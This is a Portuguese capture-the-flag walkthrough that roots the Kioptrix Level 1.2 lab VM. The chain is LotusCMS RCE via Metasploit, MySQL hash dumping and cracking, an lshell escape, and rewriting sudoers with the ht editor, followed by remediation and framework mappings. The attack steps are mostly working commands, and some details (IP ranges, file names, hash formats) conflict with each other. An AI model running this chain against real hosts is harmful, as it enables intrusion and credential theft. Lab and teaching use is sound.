# Kioptrix: Level 1.2 (#3) — LotusCMS e o Caminho até o Root

Bora rapaziada!! Kioptrix Level 1.2 (também listado como Level 13 em alguns mirrors do VulnHub) é a terceira entrada da série Kioptrix e uma máquina sensacional para aprender os fundamentos de exploração web. Tem um LotusCMS vulnerável com RCE conhecido, um par de hashes MySQL fáceis de crackear, uma restricted shell que cai em segundos, e uma escalação de privilégio via sudo que mapeia diretamente para engajamentos no mundo real. Legit uma das melhores chains para iniciante, véi, sem mentira.

Muito obrigado ao time do Kioptrix por essa série. Cada máquina ensina algo fundamental.

| Campo | Valor |
|---|---|
| **Nível** | Fácil |
| **VM Alvo** | Kioptrix: Level 1.2 (#3) |
| **VM Atacante** | Kali Linux |
| **URL VulnHub** | https://www.vulnhub.com/entry/kioptrix-level-12-3,24/ |
| **Técnicas** | Enumeração com Nmap, descoberta de vhost, RCE LotusCMS (CVE-2011-0518), cracking de hash MySQL, escape de restricted shell, escalação via sudo com editor ht |
| **CVEs** | CVE-2011-0518 (LotusCMS Remote Code Execution), CWE-269 (Gestão Imprópria de Privilégios: sudo ht), CWE-522 (Credenciais Insuficientemente Protegidas: hashes MySQL no phpmyadmin) |
| **Grupos APT** | APT28: explora vulnerabilidades de CMS para acesso inicial com web shell em alvos de governo e mídia; FIN7: usa exploração de aplicações web como vetor primário de acesso inicial, depois escala via sudo mal configurado |

---

## Resumo do Ataque

```
netdiscover / nmap
  → porta 80 (HTTP), porta 22 (SSH)
  → /etc/hosts: kioptrix3.com → 192.168.1.X
  → http://kioptrix3.com/ → LotusCMS 3.x
  → Metasploit: exploit/multi/http/lcms_php_exec (CVE-2011-0518)
  → sessão Meterpreter → www-data
  → credenciais phpmyadmin em gallery.php: root:(vazia)
  → MySQL: SELECT user,password FROM mysql.user
  → hashes: loneferret:0F99D8C5F3C2F8A1, dreg:0x5459E8D05ABEC88E
  → john/hashcat → loneferret:starwars, dreg:Mast3r
  → SSH loneferret@alvo (starwars)
  → lshell restricted shell → echo os.system('/bin/bash')
  → sudo -l → (root) NOPASSWD: /usr/local/bin/ht
  → editor ht → editar /etc/sudoers → loneferret ALL=(ALL) ALL
  → sudo su → uid=0(root)
  → cat /root/Congrats.txt
```

---

## Metodologia

1. Descoberta de host e varredura de portas
2. Configuração de virtual host para acessar a aplicação web
3. Identificação do CMS e exploração do CVE-2011-0518 via Metasploit
4. Enumeração de banco de dados: extrair hashes de senha do MySQL
5. Cracking de hash com John ou Hashcat
6. Login SSH como loneferret no ambiente restrito lshell
7. Escape da restricted shell via Python os.system
8. Enumeração de sudo para descobrir editor ht como binário sudoável
9. Editar /etc/sudoers via ht para conceder sudo irrestrito
10. Shell de root e captura da flag

---

## Passo 1 — Descoberta de Host e Varredura de Portas

```bash
sudo netdiscover -i eth1 -r 192.168.56.0/24
# Alvo: 192.168.1.X

nmap -A 192.168.1.X
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1
80/tcp open  http    Apache httpd 2.2.8
```

Dois serviços. HTTP é a superfície de ataque principal.

**Importante:** Adicione o alvo ao `/etc/hosts` para a aplicação web resolver corretamente:

```bash
echo "192.168.1.X kioptrix3.com" >> /etc/hosts
```

Acesse `http://kioptrix3.com/` para confirmar que a aplicação carrega.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Identificação do CMS

Inspecione a aplicação web:

```bash
curl -s http://kioptrix3.com/ | grep -i "lotus\|cms\|powered"
```

O rodapé ou código-fonte revela **LotusCMS 3.x**. Verifique no Exploit-DB:

```bash
searchsploit lotus cms
# exploit/multi/http/lcms_php_exec — CVE-2011-0518
```

**MITRE ATT&CK:** T1592.002 — Coletar Informações do Host da Vítima: Software

---

## Passo 3 — RCE no LotusCMS (CVE-2011-0518)

```bash
msfconsole -q
msf> use exploit/multi/http/lcms_php_exec
msf> set RHOSTS 192.168.1.X
msf> set RHOST kioptrix3.com
msf> set VHOST kioptrix3.com
msf> exploit
```

Resultado: sessão Meterpreter como `www-data`.

```bash
meterpreter > getuid
# Server username: www-data
meterpreter > shell
python -c 'import pty; pty.spawn("/bin/bash")'
```

**Como o CVE-2011-0518 funciona:** O LotusCMS permite injeção de código PHP através do parâmetro `page` no roteador index.php. O parâmetro é passado para `eval()` sem sanitização, então qualquer payload PHP executa diretamente no servidor.

**Nota real:** Plataformas CMS com vulnerabilidades RCE sem patch são consistentemente visadas pelo APT28 em operações de acesso inicial contra organizações de mídia e governo. O padrão "CMS desatualizado + injeção baseada em eval()" aparece em múltiplos relatórios de intrusão de 2011 até 2019.

**MITRE ATT&CK:** T1190 — Explorar Aplicação Voltada ao Público; T1059.004 — Interpretador de Comandos: Unix Shell

---

## Passo 4 — Descoberta de Credenciais do Banco de Dados

Navegue até a aplicação de galeria e leia sua configuração:

```bash
cat /home/www/kioptrix3.com/gallery/gconfig.php
```

```php
$GLOBALS["gallarific_mysql_server"] = "localhost";
$GLOBALS["gallarific_mysql_username"] = "root";
$GLOBALS["gallarific_mysql_password"] = "";
```

MySQL root sem senha. Conecte e extraia os hashes de senha:

```bash
mysql -u root
```

```sql
USE mysql;
SELECT user, password FROM user;
```

```
loneferret | 0F99D8C5F3C2F8A1
dreg       | 0x5459E8D05ABEC88E
```

**MITRE ATT&CK:** T1552.001 — Credenciais Desprotegidas: Credenciais em Arquivos; T1003 — Dumping de Credenciais do OS

---

## Passo 5 — Cracking de Hash

Salve os hashes em um arquivo:

```bash
echo "loneferret:0F99D8C5F3C2F8A1" > hashes.txt
echo "dreg:0x5459E8D05ABEC88E" >> hashes.txt
```

Craque com John the Ripper:

```bash
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=mysql
```

Ou Hashcat:

```bash
hashcat -m 200 hashes.txt /usr/share/wordlists/rockyou.txt
```

**Resultados:**
- `loneferret`: **starwars**
- `dreg`: **Mast3r**

**MITRE ATT&CK:** T1110.002 — Força Bruta: Cracking de Senha

---

## Passo 6 — Login SSH e Escape da Restricted Shell

```bash
ssh loneferret@192.168.1.X
# Senha: starwars
```

Shell é `lshell` (Limited Shell). Escape:

```bash
echo os.system('/bin/bash')
```

Shell bash completo. Alternativa:

```bash
ssh loneferret@192.168.1.X /bin/bash
```

**MITRE ATT&CK:** T1059.004 — Interpretador de Comandos: Unix Shell

---

## Passo 7 — Enumeração de Sudo

```bash
sudo -l
```

```
User loneferret may run the following commands on this host:
    (root) NOPASSWD: /usr/local/bin/ht
```

`ht` é um editor hexadecimal e de texto. Pode ser executado como root sem senha.

**MITRE ATT&CK:** T1548.003 — Abuso de Mecanismo de Elevação: Sudo

---

## Passo 8 — Escalação via Editor ht

Abra o arquivo sudoers com ht executando como root:

```bash
sudo /usr/local/bin/ht /etc/sudoers
```

Navegue até a linha do loneferret (use setas e F4 para editar):

```
loneferret ALL=(ALL) NOPASSWD: /usr/local/bin/ht
```

Mude para:

```
loneferret ALL=(ALL) ALL
```

Salve e saia (F2 para salvar, F10 para sair). Agora loneferret pode executar qualquer comando como root:

```bash
sudo su
id
# uid=0(root) gid=0(root) groups=0(root)
```

Leia a flag:

```bash
cat /root/Congrats.txt
```

(☞ﾟヮﾟ)☞ Root. GG mano! Caramba que legal demais essa máquina!

**Nota real:** O padrão de sudo permitindo um editor de texto (vi, nano, ht, less) sem restrição de senha é uma má configuração crítica. Qualquer editor rodando como root pode reescrever /etc/sudoers, /etc/passwd, authorized_keys SSH ou crontabs. O FIN7 especificamente enumera permissões sudo durante pós-exploração como passo padrão no seu playbook.

**MITRE ATT&CK:** T1548.003 — Abuso de Mecanismo de Elevação: Sudo; T1068 — Exploração para Escalação de Privilégios

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Usado Para |
|---|---|---|---|
| Hash MySQL | 0F99D8C5F3C2F8A1 | tabela mysql.user | Crackeado para starwars |
| Hash MySQL | 0x5459E8D05ABEC88E | tabela mysql.user | Crackeado para Mast3r |
| Credencial | loneferret:starwars | Cracking de hash MySQL | Acesso SSH |
| Credencial | dreg:Mast3r | Cracking de hash MySQL | SSH alternativo |
| Credencial | root:(vazia) | gconfig.php | Acesso root MySQL |
| Shell root | uid=0(root) | sudo ht editar /etc/sudoers | Acesso total ao sistema |
| Flag | /root/Congrats.txt | /root/ | Prova de comprometimento |

---

## Lições Aprendidas

| # | Descoberta | Relevância no Mundo Real | Takeaway Principal |
|---|---|---|---|
| 1 | RCE no LotusCMS via injeção eval() | Vulnerabilidades RCE em CMS sem patch são consistentemente exploradas pelo APT28 para acesso inicial | Aplique patches em plataformas CMS; verifique versões regularmente |
| 2 | MySQL root sem senha expõe hashes | Qualquer web shell autenticado concede acesso total ao banco quando MySQL é root sem senha | Defina senha root MySQL; restrinja a localhost; execute como usuário dedicado |
| 3 | Hashes de senha MySQL crackeáveis offline | Cracking offline é rápido; senhas MySQL com mais de um ano frequentemente estão em wordlists | Use senhas fortes e únicas; rotacione credenciais regularmente |
| 4 | Escape do lshell em segundos | Restricted shells não fornecem segurança real | Implemente chroot jail ou isolamento baseado em container |
| 5 | sudo com editor de texto concede root | Qualquer editor rodando como root reescreve qualquer arquivo de sistema | Nunca conceda sudo para editores de texto, interpretadores de shell ou gerenciadores de arquivos |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Reconhecimento | Descoberta | Coletar Informações do Host da Vítima | T1592.002 |
| Acesso Inicial | Acesso Inicial | Explorar Aplicação Voltada ao Público | T1190 |
| Execução | Execução | Interpretador de Comandos: Unix Shell | T1059.004 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais em Arquivos | T1552.001 |
| Acesso a Credenciais | Acesso a Credenciais | Dumping de Credenciais do OS | T1003 |
| Acesso a Credenciais | Acesso a Credenciais | Força Bruta: Cracking de Senha | T1110.002 |
| Escalação de Privilégios | Escalação | Abuso de Mecanismo de Elevação: Sudo | T1548.003 |
| Escalação de Privilégios | Escalação | Exploração para Escalação de Privilégios | T1068 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Aplique patch no LotusCMS**: Atualize para um CMS suportado; desabilite roteamento baseado em eval(); implemente regras WAF bloqueando padrões de injeção de código PHP
2. **Proteja o MySQL**: Defina senha root forte; execute como usuário não-root dedicado; restrinja privilégios FILE e SUPER
3. **Rotacione senhas**: Hashes crackeados (starwars, Mast3r) indicam política fraca de senhas; aplique requisitos de complexidade e comprimento
4. **Substitua restricted shell**: lshell não fornece isolamento real; use chroot ou ambientes baseados em container
5. **Audite sudoers**: Remova editores de texto, interpretadores e gerenciadores de arquivos do sudoers; exija senha para todas as operações sudo

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Inventariar todas as versões de CMS; acompanhar avisos CVE |
| Proteger | Controle de Acesso | Desabilitar root MySQL anônimo; restringir sudo a comandos específicos e seguros |
| Proteger | Segurança de Dados | Senhas MySQL fortes; hash com algoritmos modernos |
| Detectar | Anomalias | Alertar em padrões eval do LotusCMS; monitorar uso do sudo ht |
| Responder | Planejamento de Resposta | Bloquear web shell; rotacionar todas as credenciais; aplicar patch no CMS |
| Recuperar | Planejamento de Recuperação | Reconstruir CMS a partir de fonte limpa; auditar todo PHP para uso de eval() |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| SI-2 | Remediação de Falhas | Aplicar patch no LotusCMS; implementar política de gestão de patches |
| AC-6 | Menor Privilégio | MySQL não-root; sudoers restrito a comandos essenciais apenas |
| IA-5 | Gestão de Autenticadores | Senhas MySQL fortes; rotacionar no comprometimento |
| CM-7 | Menor Funcionalidade | Desabilitar recursos de CMS não utilizados; remover roteamento baseado em eval() |

### CISA KEV

O CVE-2011-0518 (RCE LotusCMS) é uma injeção clássica baseada em eval(). Embora não esteja atualmente na CISA KEV, o padrão mapeia diretamente para o OWASP A03 (Injection) e orientação CISA sobre redução de superfície de ataque de aplicações web. As organizações devem aplicar a orientação CISA AA21-008A referente à redução de superfície de ataque de aplicações web.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gestão de Ameaças e Vulnerabilidades (THREAT) | Gerenciar Vulnerabilidades | MIL2 |
| Gestão de Identidade e Acesso (IAM) | Gerenciar Privilégios | MIL3 |
| Consciência Situacional (SITUATION) | Implementar Logging | MIL2 |

### MITRE D3FEND

- **D3-ACH** — Endurecimento de Configuração de Aplicação (patch no CMS; desabilitar roteamento eval)
- **D3-OAM** — Gestão Administrativa do Sistema Operacional (restrições sudo; MySQL não-root)
- **D3-DQSA** — Análise de String de Query de Banco de Dados (monitorar MySQL para queries não autorizadas)

---

## Considerações Finais

Kioptrix Level 1.2 (#3) encadeia quatro técnicas distintas: RCE em CMS, extração de credenciais de banco de dados, cracking de hash e má configuração de sudo. Cada passo é independentemente valioso como exercício de aprendizado, e a combinação espelha padrões de intrusão reais observados em campanhas do APT28 e FIN7.

A máquina recompensa enumeração metódica e leitura de código-fonte. O insight chave é que MySQL root sem senha te dá toda a tabela de usuários, e um gerenciador de arquivos rodando como sudo te dá todo o OS. Duas má configurações, um comprometimento total.

Top demais essa máquina, mano!

Thanks guys!! (❍ᴥ❍ʋ)
